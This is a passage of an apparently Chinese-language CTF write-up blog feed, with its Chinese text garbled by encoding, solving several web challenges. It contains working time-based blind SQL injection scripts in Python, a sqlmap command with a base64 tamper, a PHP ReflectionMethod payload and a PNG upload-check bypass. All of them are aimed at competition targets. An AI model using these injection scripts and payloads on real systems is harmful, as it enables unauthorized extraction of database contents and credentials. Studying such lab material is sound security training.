class="hljs-comment">#print(passwd)</span>        data = &#123;        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,        <span class="hljs-string">&#x27;password&#x27;</span>:passwd        &#125;        before_time = time.time()        r = req.post(url, data=data, headers=headers)        after_time = time.time()        <span class="hljs-comment">#print( r.text)</span>        offset = after_time - before_time        <span class="hljs-comment"># print(offset)</span>        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):        print(passwd)        res += <span class="hljs-built_in">chr</span>(j)        print(res)        <span class="hljs-keyword">break</span>    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>    ```    `case when`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    `regexp`æ­£åˆ™åŒ¹é…     è¿™ä¸ªåŒ¹é…å¯ä»¥ç›´æ¥åŒ¹é…åˆ°å­—ç¬¦çš„åå…­è¿›åˆ¶ï¼ŒMysqlä¼šå°†åå…­è¿›åˆ¶è½¬æ¢      ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        <span class="hljs-comment">## easytricks </span>MT      ä¹Ÿæœ‰SQLæ³¨å…¥çš„ç‚¹   ` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    %s----&gt;å­—ç¬¦ä¸²      [sprintfæ ¼å¼åŒ–æ³¨å…¥æ¼æ´](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     `æ²¡åšå­—ç¬¦ç±»å‹æ£€æµ‹çš„æœ€å¤§å±å®³å°±æ˜¯å®ƒå¯ä»¥åƒæ‰ä¸€ä¸ªè½¬ä¹‰ç¬¦\, å¦‚æœ%åé¢å‡ºç°ä¸€ä¸ª\,é‚£ä¹ˆphpä¼šæŠŠ\å½“ä½œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„ç±»å‹è€Œåƒæ‰\, æœ€å%\ï¼ˆæˆ–%<span class="hljs-number">1</span>$\ï¼‰è¢«æ›¿æ¢ä¸ºç©º`  ![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     å¯ä»¥çœ‹åˆ°`%<span class="hljs-number">1</span>$`åçš„`<span class="hljs-string">&#x27;`è¢«åäº†      </span><span class="hljs-string"></span><span class="hljs-string">[MTCTF-2021 Write_Up by æ‰“CTFä¸é å®åŠ›é è¿æ°”](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">##  easy_source   </span><span class="hljs-string">CISCN   </span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">`.index.php.swo`    </span><span class="hljs-string"></span><span class="hljs-string">    ```php</span><span class="hljs-string">    &lt;?php</span><span class="hljs-string">    class User</span><span class="hljs-string">    &#123;</span><span class="hljs-string">        private static $c = 0;</span><span class="hljs-string"></span><span class="hljs-string">        function a()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function b()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function c()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function d()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function e()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function f()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function g()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function h()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function i()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function j()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function k()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function l()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function m()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function n()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function o()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function p()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function q()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function r()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function s()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string"></span><span class="hljs-string">        function t()</span><span class="hljs-string">        &#123;</span><span class="hljs-string">            return ++self::$c;</span><span class="hljs-string">        &#125;</span><span class="hljs-string">        </span><span class="hljs-string">    &#125;</span><span class="hljs-string"></span><span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span><span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span><span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span><span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span><span class="hljs-string">    $method= new $rc($ra, $rb);</span><span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></code></pre><p>åˆ©ç”¨PHPåŸç”Ÿç±»è¯»å–ç±»ä¸­çš„æ³¨é‡Š<br><code>ReflectionMethod</code>  </p><p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>â€“&gt;$classç±»çš„åç§°      </p><p>â€“&gt;$nameæ–¹æ³•çš„åç§°         </p><p>æˆ–è€…<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p><p>$class_methodâ€“&gt;ç±»çš„åç§°å’Œæ–¹æ³•çš„åç§°ä¸­é—´ä»¥<code>::</code>åˆ†å‰²      </p><p>ReflectionMethodä¸­çš„<code>getDocComment</code>å¯ä»¥è¿”å›æ³¨é‡Š ä»£ç      </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png">     </p><p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p><p>ReflectionMethodé‡Œçš„å…¶ä»–æ–¹æ³•    </p><pre><code>```php$ref = new ReflectionClass(B::class);//print_r(ReflectionClass::export(demo::class));print_r($ref-&gt;getProperties()); // è·å–ä¸€çº§å±æ€§, å¯ä»¥ä¼ å‚æ•°è¿‡æ»¤, è¿”å›ReflectionProperty å¯¹è±¡çš„æ•°ç»„ã€‚var_dump($ref-&gt;getConstructor()); // è·å–æ„é€ å‡½æ•°, æœªå®šä¹‰è¿”å›nullvar_dump($ref-&gt;inNamespace()); // æ˜¯å¦åœ¨å‘½åç©ºé—´ä¸­var_dump($ref-&gt;getConstants()); // è·å–æ‰€æœ‰å®šä¹‰çš„å¸¸é‡var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // è·å–æŸä¸ªå¸¸é‡print_r($ref-&gt;getDefaultProperties()); // è·å–é»˜è®¤å±æ€§, è¿”å›æ•°ç»„, åŒ…æ‹¬çˆ¶ç±»çš„å±æ€§var_dump($ref-&gt;getDocComment()); // è·å–ç±»æ–‡æ¡£æ³¨é‡Š, ä¸åŒ…å«å±æ€§å’Œæ–¹æ³•çš„æ³¨é‡Š, æ— æ³¨é‡Šè¿”å›falsevar_dump($ref-&gt;getExtension()); // è·å–è·å–æœ€åä¸€è¡Œçš„è¡Œæ•°var_dump($ref-&gt;getFileName()); // è·å–å®šä¹‰ç±»çš„æ–‡ä»¶å, è¿”å›ç»å¯¹è·¯å¾„var_dump($ref-&gt;getInterfaceNames()); // è·å–æ¥å£åç§°, è¿”å›ç´¢å¼•æ•°ç»„,å€¼ä¸ºæ¥å£åç§°, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getInterfaces()); // è·å–æ¥å£, è¿”å›å…³è”æ•°ç»„, name=&gt;ReflectionClasså®ä¾‹, æœªå®ç°æ¥å£è¿”å›ç©ºæ•°ç»„var_dump($ref-&gt;getMethods()); // æŒ‡è·å–ç±»æ–¹æ³• ReflectionMethodã€‚var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // è·å–ä¸€ä¸ªç±»æ–¹æ³•çš„ ReflectionMethodã€‚å¦‚æœæ–¹æ³•ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€è¦é…åˆtry catchä¸€èµ·ç”¨var_dump($ref-&gt;getName()); // è·å–ç±»å, åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getNamespaceName()); // è·å–å‘½åç©ºé—´çš„åç§°, æ²¡æœ‰è¿”å›ç©ºvar_dump($ref-&gt;getParentClass()); // è·å–çˆ¶ç±»reflectionClassçš„å®ä¾‹, æ²¡æœ‰çˆ¶ç±»è¿”å›falsevar_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // è·å–ä¸€ä¸ªå±æ€§, è¿”å›ReflectionPropertyå®ä¾‹, å±æ€§ä¸å­˜åœ¨ä¼šæŠ›å‡ºå¼‚å¸¸, éœ€é…åˆtry catchä½¿ç”¨var_dump($ref-&gt;getShortName()); // è·å–ç±»å, ä¸åŒ…å«å‘½åç©ºé—´var_dump($ref-&gt;getStartLine()); // è·å–èµ·å§‹è¡Œå·print_r($ref-&gt;getStaticProperties()); // è·å–é™æ€å±æ€§print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // è·å–é™æ€å±æ€§å€¼, æœªå®šä¹‰çš„å±æ€§ä¼šæŠ¥è‡´å‘½é”™è¯¯print_r($ref-&gt;getTraitAliases()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraitNames()); // è¿”å› trait åˆ«åçš„ä¸€ä¸ªæ•°ç»„print_r($ref-&gt;getTraits()); // è¿”å›è¿™ä¸ªç±»æ‰€ä½¿ç”¨çš„ traits æ•°ç»„var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // æ£€æŸ¥å¸¸é‡æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // æ£€æŸ¥æ–¹æ³•æ˜¯å¦å·²ç»å®šä¹‰var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // æ£€æŸ¥å±æ€§æ˜¯å¦å·²å®šä¹‰var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // æ£€æŸ¥æ˜¯å¦å®ç°äº†æŸä¸ªæ¥å£, æ³¨æ„éœ€è¦å¸¦ä¸Šå‘½åç©ºé—´var_dump($ref-&gt;isAbstract()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯æŠ½è±¡ç±»ï¼ˆabstractï¼‰var_dump($ref-&gt;isAnonymous()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯åŒ¿åç±»var_dump($ref-&gt;isCloneable()); // è¿”å›äº†ä¸€ä¸ªç±»æ˜¯å¦å¯å¤åˆ¶var_dump($ref-&gt;isFinal()); // æ£€æŸ¥ç±»æ˜¯å¦å£°æ˜ä¸º finalvar_dump($ref-&gt;isInstance($obj)); // æ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ­¤ç±»çš„å®ä¾‹var_dump($ref-&gt;isInstantiable()); // æ£€æŸ¥ç±»æ˜¯å¦å¯å®ä¾‹åŒ–var_dump($ref-&gt;isInterface()); // æ£€æŸ¥ç±»æ˜¯å¦æ˜¯ä¸€ä¸ªæ¥å£ï¼ˆinterfaceï¼‰var_dump($ref-&gt;isInternal()); // æ£€æŸ¥ç±»æ˜¯å¦ç”±æ‰©å±•æˆ–æ ¸å¿ƒåœ¨å†…éƒ¨å®šä¹‰, å’ŒisUserDefinedç›¸å¯¹var_dump($ref-&gt;isIterateable()); // æ£€æŸ¥æ­¤ç±»æ˜¯å¦å¯è¿­ä»£, å®ç°äº†Iteratoræ¥å£å³å¯è¿­ä»£var_dump($ref-&gt;isSubclassOf(A::class)); // æ˜¯å¦æ˜¯æŸä¸€ä¸ªç±»çš„å­ç±»var_dump($ref-&gt;isTrait()); // è¿”å›äº†æ˜¯å¦ä¸ºä¸€ä¸ª traitvar_dump($ref-&gt;isUserDefined()); // æ£€æŸ¥æ˜¯å¦ç”±ç”¨æˆ·å®šä¹‰çš„ç±» å’ŒisInternalç›¸å¯¹// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚// æ¥å—å¯å˜æ•°ç›®çš„å‚æ•°ï¼Œç”¨äºä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ï¼Œå’Œ call_user_func() å¾ˆç›¸ä¼¼ã€‚var_dump($ref-&gt;newInstance());// ä»æŒ‡å®šçš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»å®ä¾‹,åˆ›å»ºç±»çš„æ–°çš„å®ä¾‹ã€‚ç»™å‡ºçš„å‚æ•°å°†ä¼šä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚//è¿™ä¸ªå‚æ•°ä»¥ array å½¢å¼ä¼ é€’åˆ°ç±»çš„æ„é€ å‡½æ•°ã€‚var_dump($ref-&gt;newInstanceArgs([]));var_dump($ref-&gt;newInstanceWithoutConstructor()); // åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹è€Œä¸è°ƒç”¨ä»–çš„æ„é€ å‡½æ•°$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // è®¾ç½®é™æ€å±æ€§çš„å€¼, æ— è¿”å›å€¼var_dump($ref-&gt;__toString ()); // è¿”å› ReflectionClass å¯¹è±¡å­—ç¬¦ä¸²çš„è¡¨ç¤ºå½¢å¼ã€‚â€‹```</code></pre><p><a href="http://www.xl-bit.cn/index.php/archives/434/">Bitâ€™s Blog â€”-CISCN2021â€”åˆèµ›â€”WPï¼ˆåŠéƒ¨åˆ†è§£é¢˜æ€è·¯ï¼‰</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Avatar Uploader 1</title>
    <link href="/2021/05/24/BUU88/"/>
    <url>/2021/05/24/BUU88/</url>
    
    <content type="html"><![CDATA[<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>æ‰“å¼€ç¯å¢ƒ  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/ec5696d2927c25ee.png"><br>å…ˆéšä¾¿è¾“ä¸ªè¿›å»çœ‹çœ‹<br><img src="https://ftp.bmp.ovh/imgs/2021/05/5c988c69bedf52e1.png">     </p><p>æ–‡ä»¶ä¸Šä¼    </p><p>å°è¯•äº†å‡ ä¸‹ï¼Œæ„Ÿè§‰æ²¡æˆï¼Œåªè®©ä¸Šä¼ PNG    </p><p>çœ‹ä¸‹WP<br>ç»™äº†æºç     </p><p><code>upload.php</code>    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/util.php&#x27;</span>);<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib/session.php&#x27;</span>);$session = <span class="hljs-keyword">new</span> SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);<span class="hljs-comment">// check whether file is uploaded</span><span class="hljs-keyword">if</span> (!file_exists($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]) || !is_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;No file was uploaded.&#x27;</span>);&#125;<span class="hljs-comment">// check file size</span><span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">256000</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is too large.&#x27;</span>);&#125;<span class="hljs-comment">// check file type</span>$finfo = finfo_open(FILEINFO_MIME_TYPE);$type = finfo_file($finfo, $_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);finfo_close($finfo);<span class="hljs-keyword">if</span> (!in_array($type, [<span class="hljs-string">&#x27;image/png&#x27;</span>])) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded file is not PNG format.&#x27;</span>);&#125;<span class="hljs-comment">// check file width/height</span>$size = getimagesize($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">0</span>] &gt; <span class="hljs-number">256</span> || $size[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">256</span>) &#123;<span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;Uploaded image is too large.&#x27;</span>);&#125;<span class="hljs-keyword">if</span> ($size[<span class="hljs-number">2</span>] !== IMAGETYPE_PNG) &#123;<span class="hljs-comment">// I hope this never happens...</span><span class="hljs-built_in">error</span>(<span class="hljs-string">&#x27;What happened...? OK, the flag for part 1 is: &lt;code&gt;&#x27;</span> . getenv(<span class="hljs-string">&#x27;FLAG1&#x27;</span>) . <span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>);&#125;<span class="hljs-comment">// ok</span>$filename = bin2hex(random_bytes(<span class="hljs-number">4</span>)) . <span class="hljs-string">&#x27;.png&#x27;</span>;move_uploaded_file($_FILES[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], UPLOAD_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . $filename);$session-&gt;set(<span class="hljs-string">&#x27;avatar&#x27;</span>, $filename);flash(<span class="hljs-string">&#x27;info&#x27;</span>, <span class="hljs-string">&#x27;Your avatar has been successfully updated!&#x27;</span>);redirect(<span class="hljs-string">&#x27;/&#x27;</span>);</code></pre></code></pre><p><code>getimagesize</code>å‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„     </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/856b33eae66eb5e9.png">      </p><p><code>[0]</code>å’Œ<code>[1]</code>åˆ†åˆ«æ˜¯å®½åº¦å’Œé«˜åº¦<br><code>[2]</code>æ˜¯å›¾ç‰‡çš„ç±»å‹    </p><pre><code>GIFï¼ŒJPGï¼ŒPNGï¼ŒSWFï¼ŒSWCï¼ŒPSDï¼ŒTIFFï¼ŒBMPï¼ŒIFFï¼ŒJP2ï¼ŒJPXï¼ŒJB2ï¼ŒJPCï¼ŒXBM æˆ– WBMP       æŒ‰æ­¤é¡ºåºçš„ç¼–å·1=&gt;GIFã€3=&gt;PNG     </code></pre><p>æŒ‰æºç çš„è¦æ±‚ï¼Œéœ€è¦<code>finfo_file()</code>ä¸º<code>imag/png</code>ï¼›è€Œ<code>getimagesize</code>å¾—åˆ°çš„<code>$size[2]!==IMAGETYPE_PNG</code>       </p><p><code>finfo_file()</code>è¯†åˆ«PNGæ–‡ä»¶åå…­è¿›åˆ¶ä¸‹çš„ç¬¬ä¸€è¡Œï¼Œåˆ æ‰å‰©ä½™çš„æ•°æ®å³å¯ç»•è¿‡<code>getimagesize()</code>    </p><p>æ‰€ä»¥ç”¨<code>winhex</code>å¯¹æ–‡ä»¶å¤„ç†<br><img src="https://ftp.bmp.ovh/imgs/2021/05/cef90b357e70f2a4.png">      </p><p>ä¸Šä¼ åå³å¯å¾—åˆ°flag   </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cc52aa2d9fdf817e.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>php</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æµ·æ´‹å¤§å­¦CTF</title>
    <link href="/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/"/>
    <url>/2021/05/23/%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6CTF/</url>
    
    <content type="html"><![CDATA[<h2 id="åˆæˆå¤§æ™¦æ°”"><a href="#åˆæˆå¤§æ™¦æ°”" class="headerlink" title="åˆæˆå¤§æ™¦æ°”"></a>åˆæˆå¤§æ™¦æ°”</h2><p>jsé‡Œæ‰¾åˆ°flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/736d3094cd3cbd89.png">      </p><h2 id="ç™½ç»™å¯†ç "><a href="#ç™½ç»™å¯†ç " class="headerlink" title="ç™½ç»™å¯†ç "></a>ç™½ç»™å¯†ç </h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/cf263d59e13cbc37.png">    </p><p>sqlæ³¨å…¥ï¼Œä¸è¿‡è¿™é“é¢˜å¯¹usernameå’Œpasswordè¿›è¡Œbase64ç¼–ç ï¼›æŠ“åŒ…åä¸‡èƒ½å¯†ç å¾—åˆ°flag    </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png">        </p><h2 id="Deepâ™‚Darkâ™‚Database"><a href="#Deepâ™‚Darkâ™‚Database" class="headerlink" title="Deepâ™‚Darkâ™‚Database"></a>Deepâ™‚Darkâ™‚Database</h2><p>ä¸Šä¸€é“é¢˜çš„ç¯å¢ƒï¼Œä¸è¿‡è¿˜æœ‰flagï¼Œåº”è¯¥åœ¨æ•°æ®åº“é‡Œï¼›æœ€ç®€å•çš„æ—¶é—´ç›²æ³¨ï¼Œä»€ä¹ˆä¹Ÿæ²¡è¿‡æ»¤   </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> base64<span class="hljs-keyword">import</span> datetimeurl=<span class="hljs-string">&#x27;http://39.106.29.44:10424/&#x27;</span>flag=<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">80</span>):    s=<span class="hljs-number">30</span>    l=<span class="hljs-number">127</span>    mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span>(s&lt;l):        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        <span class="hljs-comment">#payload=&quot;1&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;.format(i,mid)</span>        payload=<span class="hljs-string">&quot;1&#x27; or if((ascii(substr((select flag from ctf.flag limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;),sleep(5),1)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)        pay=base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))        payl=<span class="hljs-built_in">str</span>(pay)        print(payload)        data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;YWRtaW4=&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:payl[<span class="hljs-number">2</span>:<span class="hljs-number">-1</span>]&#125;        time1=datetime.datetime.now()        re=requests.post(url=url,data=data)        time2=datetime.datetime.now()        tem=(time2-time1).seconds        <span class="hljs-keyword">if</span>(tem&gt;<span class="hljs-number">3</span>):            s=mid+<span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            l=mid        mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>    flag+=<span class="hljs-built_in">chr</span>(mid)    print(flag)</code></pre></code></pre><p>æˆ–è€…ç›´æ¥sqlmapä¹Ÿå¯ï¼Œsqlmapé‡Œæœ‰å¯¹payloadè¿›è¡Œbase64ç¼–ç çš„tamperï¼›æˆ‘è¿˜å‚»å‚»çš„å†™äº†ä¸ª     </p><p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p><p>å¾—åˆ°çš„flag  </p><p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png">     </p><p>hexè§£ç â€“&gt;base64è§£ç â€”&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p><h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>ä»£ç å®¡è®¡     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);    $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];    $filePath = <span class="hljs-string">&#x27;./uploads/&#x27;</span>.md5($iipp);    $filePath_2 = $filePath.<span class="hljs-string">&#x27;/test.txt&#x27;</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]))    &#123;        <span class="hljs-keyword">if</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;write&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]))&#123;            <span class="hljs-keyword">if</span>(!file_exists($filePath))&#123;                 mkdir($filePath);                &#125;            $res = file_put_contents($filePath_2, base64_decode(($_POST[<span class="hljs-string">&#x27;content&#x27;</span>])));            <span class="hljs-keyword">if</span>($res) <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;Successful!&quot;</span>.<span class="hljs-string">&quot; your path is &quot;</span>.$filePath_2);        &#125;        <span class="hljs-keyword">elseif</span>($_GET[<span class="hljs-string">&#x27;action&#x27;</span>]===<span class="hljs-string">&#x27;check&#x27;</span> &amp;&amp; <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>])) &#123;            <span class="hljs-keyword">if</span>(file_exists($_GET[<span class="hljs-string">&#x27;filepath&#x27;</span>]))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;yes&#x27;</span>;            &#125;            <span class="hljs-keyword">else</span>&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no&#x27;</span>;            &#125;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;error&#x27;</span>);        &#125;    &#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>æ„Ÿè§‰æ²¡å•¥å¯åˆ©ç”¨çš„ï¼Œå†™å…¥ä¹Ÿæ˜¯å†™è¿›<code>txt</code>æ–‡ä»¶<br>æœ‰ä¸ª<code>secret.php</code>ä½†ç›´æ¥è®¿é—®ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œä¸ä¼šäº†  